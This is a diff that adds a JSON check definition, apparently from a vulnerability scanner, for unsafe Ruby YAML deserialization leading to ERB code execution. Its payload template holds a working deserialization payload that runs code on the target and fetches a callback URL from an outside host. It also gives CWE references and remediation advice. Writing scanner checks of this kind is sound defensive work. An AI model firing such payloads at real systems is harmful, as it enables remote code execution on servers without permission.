@@ -1,0 +1,20 @@
+{
+  "id": "m3-blind-deser-ruby-yaml-erb",
+  "bug_class": "rce",
+  "title": "Unsafe YAML load (Ruby Psych -> ERB code execution)",
+  "severity": "Critical",
+  "applies_when": {
+    "category": "ruby"
+  },
+  "insertion_kinds": [],
+  "oracle": {
+    "kind": "oob",
+    "payload_template": "--- !ruby/object:ERB\nsrc: \"<%= require 'open-uri'; URI.open('http://{callback}').read %>\"\nlineno: 1\n"
+  },
+  "references": [
+    "CWE-502",
+    "CAPEC-586"
+  ],
+  "remediation": "Never deserialize untrusted data into arbitrary types. Use allowlist-based deserialization or a data-only format (JSON with a fixed schema), disable polymorphic type handling, and remove/patch the gadget libraries on the classpath. The inbound callback proves the gadget chain executed.",
+  "payload_family": "ruby-yaml-erb"
+}
